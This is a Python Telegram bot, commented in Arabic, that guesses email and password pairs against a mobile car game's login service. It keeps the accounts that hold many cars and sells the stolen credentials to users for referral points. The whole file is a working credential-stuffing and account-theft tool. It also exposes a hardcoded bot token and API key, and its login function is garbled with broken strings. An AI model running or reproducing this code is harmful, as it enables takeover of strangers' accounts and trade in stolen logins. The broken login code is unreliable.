import urllib.request
import urllib.parse
import json
import random
import time
import sys
import os
import threading
import string
from flask import Flask
import telebot
from telebot import types

# ================== الإعدادات ==================
BOT_TOKEN = "8807194549:AAGcUNewT82vYW7rxdngAdSYOTlvCvYUOo8"
ADMIN_ID = "7075895496"  # مهدي
ADMIN_USERNAME = "@XOREYT"
THREADS = 80  # زدنا السرعة

BOT_LINK = "https://t.me/YourBotLinkHere"  # <--- حط رابط البوت حقك هنا عشان الإحالات تشتغل
DB_USERS = "users.json"
DB_CHANNELS = "channels.json"
DB_STOCK = "stock.txt"

# ================== قاعدة البيانات ==================
def load_json(filename):
    if os.path.exists(filename):
        with open(filename, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_json(filename, data):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=4)

users = load_json(DB_USERS)
channels = load_json(DB_CHANNELS)  # { "channel_id": "name" }

# ================== الحالة ==================
good = 0
bad = 0
total = 0
lock = threading.Lock()
STOP_FLAG = threading.Event()
RUNNING = False

# ================== Flask ==================
app = Flask(__name__)

@app.route("/")
def index():
    return "Mehdi's Car Parking Bot is running!"

def keep_alive():
    t = threading.Thread(target=lambda: app.run(host="0.0.0.0", port=10000))
    t.daemon = True
    t.start()

# ================== البوت ==================
bot = telebot.TeleBot(BOT_TOKEN)

def check_forced_sub(message):
    if str(message.from_user.id) == ADMIN_ID: return True
    if not channels: return True
    
    not_joined = []
    for ch_id, ch_name in channels.items():
        try:
            member = bot.get_chat_member(ch_id, message.from_user.id)
            if member.status in ['left', 'kicked']:
                not_joined.append(ch_name)
        except:
            not_joined.append(ch_name)
            
    if not_joined:
        markup = types.InlineKeyboardMarkup()
        for ch_id, ch_name in channels.items():
            try:
                chat_info = bot.get_chat(ch_id)
                link = chat_info.invite_link or f"https://t.me/{chat_info.username}"
                markup.add(types.InlineKeyboardButton(text=f"اشترك في {ch_name}", url=link))
            except:
                pass
        markup.add(types.InlineKeyboardButton(text="✅ تحقق", callback_data="check_sub"))
        bot.send_message(message.chat.id, "⚠️ يجب عليك الاشتراك في القنوات التالية أولاً:", reply_markup=markup)
        return False
    return True

def get_user(user_id):
    uid = str(user_id)
    if uid not in users:
        users[uid] = {
            "points": 0,
            "refs": 0,
            "referred_by": None,
            "joined": time.time(),
            "last_daily": 0
        }
        save_json(DB_USERS, users)
    return users[uid]

def add_points(user_id, amount):
    uid = str(user_id)
    if uid not in users: get_user(uid)
    users[uid]["points"] += amount
    save_json(DB_USERS, users)

# ================== دالة الصيد (معدلة) ==================
def http_post(url, json_data=None, headers=None, timeout=10):
    try:
        data = json.dumps(json_data).encode('utf-8') if json_data else None
        req = urllib.request.Request(url, data=data, method='POST')
        if headers:
            for k, v in headers.items(): req.add_header(k, v)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', errors='ignore')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', errors='ignore')
    except: return 0, ''

def get_car_count(id_token):
    try:
        url = "https://europe-west1-cp-multiplayer.cloudfunctions.net/GetAllCars2"
        headers = {"authorization": f"Bearer {id_token}", "content-type": "application/json", "user-agent": "CarParking/265 CFNetwork/3860.700.1 Darwin/25.6.0"}
        status, body = http_post(url, {"data": None}, headers, timeout=10)
        if status == 200:
            data = json.loads(body)
            if 'result' in data:
                cars_data = json.loads(data['result'])
                if isinstance(cars_data, list): return len(cars_data)
                elif isinstance(cars_data, dict): return len(cars_data.get('cars', []))
    except: pass
    return 0

def check_account(email, password):
    global good, bad
    try:
        login_url = "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeD {"ZHYUO2bYUser8Bfnf5rRgrQ-AGPTM"
        login_payload = {"email":gent email, "password": password, "returnSecure":Token": True, "clientType": "CLIENT_TYPE "_IOS"}
        login_headers =CarParking/265 CFNetwork/3860.700.1 Darwin/25.6.0", "Content-Type": "application/octet-stream", "X-Unity-Version": "2022.3.62f2"}
        
        status, body = http_post(login_url, login_payload, login_headers, timeout=10)
        if status == 200:
            res_json = json.loads(body)
            id_token = res_json.get('idToken')
            if id_token:
                car_count = get_car_count(id_token)
                if car_count >= 30:  # فلترة: 30 سيارة وأكثر فقط
                    with lock: good += 1
                    with open(DB_STOCK, 'a', encoding='utf-8') as f:
                        f.write(f'{email}:{password}:{car_count}\n')
                else:
                    with lock: bad += 1
        else:
            with lock: bad += 1
    except: pass

FIRST_NAMES = ['john', 'mike', 'sara', 'ali', 'omar', 'lina', 'adam', 'huda', 'kareem', 'noor']
WORDS = ['cool', 'fast', 'dark', 'king', 'star', 'fire', 'wolf', 'lion', 'sky', 'pro']
PASSWORDS = ['12345678', '123456789', 'password', '123456', '123123', '1234567', '00000000', '12345', 'qwerty', '1234567890']

def generate_credentials():
    pattern = random.randint(0, 3)
    if pattern == 0: name = random.choice(FIRST_NAMES) + ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    elif pattern == 1: name = random.choice(FIRST_NAMES) + ''.join(random.choices(string.digits, k=random.randint(0, 2)))
    elif pattern == 2: name = random.choice(WORDS) + random.choice(['', '123', '2023', '2024'])
    else: name = 'user' + str(random.randint(1000, 9999))
    return name + '@gmail.com', random.choice(PASSWORDS)

def worker():
    while not STOP_FLAG.is_set():
        email, password = generate_credentials()
        check_account(email, password)
        time.sleep(random.uniform(0.005, 0.02)) # سرعة أعلى

def run_checker():
    global RUNNING, good, bad, total
    with lock: good = 0; bad = 0; total = 0
    RUNNING = True
    STOP_FLAG.clear()
    for _ in range(THREADS):
        threading.Thread(target=worker, daemon=True).start()
    while RUNNING and not STOP_FLAG.is_set():
        time.sleep(10)

# ================== أوامر البوت ==================
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if not check_forced_sub(message): return
    
    user = get_user(message.from_user.id)
    ref_id = message.text.split()[1] if len(message.text.split()) > 1 else None
    
    if ref_id and ref_id != str(message.from_user.id) and user["referred_by"] is None:
        user["referred_by"] = ref_id
        add_points(ref_id, 5)
        try: bot.send_message(int(ref_id), f"🎉 شخص جديد دخل من رابطك! حصلت على 5 نقاط.")
        except: pass
        save_json(DB_USERS, users)

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    if str(message.from_user.id) == ADMIN_ID:
        markup.add("▶️ بدء الصيد", "🛑 إيقاف الصيد")
        markup.add("🏪 المتجر", "💎 نقاطي")
        markup.add("📢 إذاعة", "⚙️ إدارة القنوات")
    else:
        markup.add("🏪 المتجر", "💎 نقاطي")
        markup.add("🎁 هدية يومية", "🔗 رابط الإحالة")
    
    text = f"👋 أهلاً بك يا {message.from_user.first_name} في بوت مهدي للصيد.\n\n💎 نقاطك: {user['points']}"
    bot.send_message(message.chat.id, text, reply_markup=markup)

@bot.message_handler(func=lambda message: message.text == "🏪 المتجر")
def shop(message):
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🚗 صيدة واحدة (1 نقطة)", callback_data="buy_1"))
    bot.send_message(message.chat.id, "🛒 المتجر:\n\nاضغط لشراء صيدة مقابل 1 نقطة.", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "buy_1")
def buy_hit(call):
    user = get_user(call.from_user.id)
    if user["points"] < 1:
        bot.answer_callback_query(call.id, "❌ نقاطك غير كافية!", show_alert=True)
        return
    
    try:
        with open(DB_STOCK, 'r', encoding='utf-8') as f: lines = f.readlines()
        if not lines:
            bot.answer_callback_query(call.id, "⚠️ لا توجد حسابات في المخزن حالياً، انتظر.", show_alert=True)
            return
        hit = lines[0]
        with open(DB_STOCK, 'w', encoding='utf-8') as f: f.writelines(lines[1:])
        user["points"] -= 1
        save_json(DB_USERS, users)
        bot.send_message(call.from_user.id, f"✅ تم الشراء!\n\n{hit}")
        bot.answer_callback_query(call.id, "تم الشراء بنجاح.")
    except:
        bot.answer_callback_query(call.id, "⚠️ خطأ في جلب الصيدة.", show_alert=True)

@bot.message_handler(func=lambda message: message.text == "💎 نقاطي")
def my_points(message):
    user = get_user(message.from_user.id)
    bot.reply_to(message, f"💎 نقاطك الحالية: {user['points']}\n👥 عدد إحالاتك: {user['refs']}")

@bot.message_handler(func=lambda message: message.text == "🔗 رابط الإحالة")
def ref_link(message):
    link = f"{BOT_LINK}?start={message.from_user.id}"
    bot.reply_to(message, f"🔗 رابط الإحالة الخاص بك:\n`{link}`\n\n👈 شاركه مع أصدقائك، وكل شخص يدخل تحصل على 5 نقاط!", parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🎁 هدية يومية")
def daily_gift(message):
    user = get_user(message.from_user.id)
    now = time.time()
    if now - user["last_daily"] < 86400:
        remain = int(86400 - (now - user["last_daily"]))
        hrs = remain // 3600; mins = (remain % 3600) // 60
        bot.reply_to(message, f"⚠️ لقد أخذت هديتك اليوم.\n⏳ متبقي: {hrs} ساعة و {mins} دقيقة.")
        return
    user["last_daily"] = now
    add_points(message.from_user.id, 1)
    bot.reply_to(message, "🎁 مبروك! حصلت على نقطة واحدة.")

# ================== أوامر الأدمن ==================
@bot.message_handler(func=lambda message: str(message.from_user.id) == ADMIN_ID and message.text == "▶️ بدء الصيد")
def admin_start(message):
    if RUNNING: return bot.reply_to(message, "⚠️ شغال.")
    
    msg = bot.reply_to(message, "⏳ جاري تجهيز الصيد...")
    chat_id = msg.chat.id; msg_id = msg.message_id
    
    def update_progress():
        for i in range(1, 101):
            if STOP_FLAG.is_set(): break
            try:
                filled = "█" * (i // 10) + "░" * (10 - i // 10)
                bot.edit_message_text(f"⏳ جاري الصيد...\n\n[{filled}] {i}%", chat_id, msg_id)
            except: pass
            time.sleep(1.5)
        if not STOP_FLAG.is_set():
            bot.edit_message_text("✅ تم بدء الصيد في الخلفية!", chat_id, msg_id)

    threading.Thread(target=run_checker, daemon=True).start()
    threading.Thread(target=update_progress, daemon=True).start()

@bot.message_handler(func=lambda message: str(message.from_user.id) == ADMIN_ID and message.text == "🛑 إيقاف الصيد")
def admin_stop(message):
    global RUNNING
    STOP_FLAG.set(); RUNNING = False
    bot.reply_to(message, "🛑 تم الإيقاف. المخزن جاهز للبيع.")

@bot.message_handler(func=lambda message: str(message.from_user.id) == ADMIN_ID and message.text == "📢 إذاعة")
def admin_broadcast_start(message):
    msg = bot.reply_to(message, "📢 أرسل الرسالة الآن (نص، صورة، ملف..):")
    bot.register_next_step_handler(msg, admin_broadcast_send)

def admin_broadcast_send(message):
    bot.reply_to(message, "⏳ جاري الإرسال للجميع...")
    count = 0
    for uid in list(users.keys()):
        try:
            bot.copy_message(chat_id=uid, from_chat_id=message.chat.id, message_id=message.message_id)
            count += 1
        except: pass
    bot.send_message(ADMIN_ID, f"✅ تم الإرسال إلى {count} شخص.")

@bot.message_handler(func=lambda message: str(message.from_user.id) == ADMIN_ID and message.text == "⚙️ إدارة القنوات")
def admin_channels(message):
    text = "⚙️ إدارة الاشتراك الإجباري\n\nالقنوات الحالية:\n"
    for c_id, c_n in channels.items():
        text += f"- {c_n} (`{c_id}`)\n"
    text += "\nلإضافة قناة:\n`/addchannel @username او ID`\nلحذف قناة:\n`/delchannel ID`"
    bot.reply_to(message, text, parse_mode="Markdown")

@bot.message_handler(commands=['addchannel'])
def add_channel(message):
    if str(message.from_user.id) != ADMIN_ID: return
    try:
        ch = message.text.split(maxsplit=1)[1]
        if ch.startswith('@'):
            chat_info = bot.get_chat(ch)
            channels[str(chat_info.id)] = chat_info.title
        else:
            channels[str(ch)] = "قناة " + str(ch)
        save_json(DB_CHANNELS, channels)
        bot.reply_to(message, "✅ تم إضافة القناة.")
    except Exception as e:
        bot.reply_to(message, f"❌ خطأ: تأكد أن البوت مشرف في القناة.\n{e}")

@bot.message_handler(commands=['delchannel'])
def del_channel(message):
    if str(message.from_user.id) != ADMIN_ID: return
    try:
        ch = message.text.split(maxsplit=1)[1]
        if ch in channels:
            del channels[ch]
            save_json(DB_CHANNELS, channels)
            bot.reply_to(message, "✅ تم حذف القناة.")
        else:
            bot.reply_to(message, "❌ القناة غير موجودة.")
    except:
        bot.reply_to(message, "❌ الاستخدام: /delchannel ID")

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_sub_cb(call):
    if check_forced_sub(call.message):
        bot.send_message(call.from_user.id, "✅ تم التحقق! أرسل /start للبدء.")
    else:
        bot.answer_callback_query(call.id, "❌ لم تشترك بعد.", show_alert=True)

# ================== تشغيل ==================
if __name__ == "__main__":
    keep_alive()
    print("Mehdi's Car Parking Bot is running...")
    bot.infinity_polling()
